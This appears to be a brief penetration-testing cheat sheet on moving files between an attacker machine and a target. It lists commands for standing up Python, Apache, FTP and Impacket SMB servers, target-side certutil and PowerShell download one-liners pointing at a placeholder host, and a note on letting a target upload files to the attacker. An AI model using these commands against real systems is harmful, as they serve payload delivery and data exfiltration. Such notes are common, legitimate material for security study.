# File Sharing

```
python -m SimpleHTTPServer [port]
```

```
python3 -m http.server [port]
```

```
mv file /var/www/html/ 
//and start the Apache2 service with 
service apache2 start
```

```
certutil -urlcache -split -f "http://ip-addr:port/file" [output-file]
```

```
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
```

```
sudo apt-get install python-pyftpdlib
python -m pyftpdlib [-p port].

//The default port pyftpdlib uses is port 2121. You can also append the
-w option to allow anonymous write, so that the target can anonymously upload files to the attacker machine.
```

```
python /usr/share/doc/python-impacket/examples/smbserver.py share-name root-dir
```

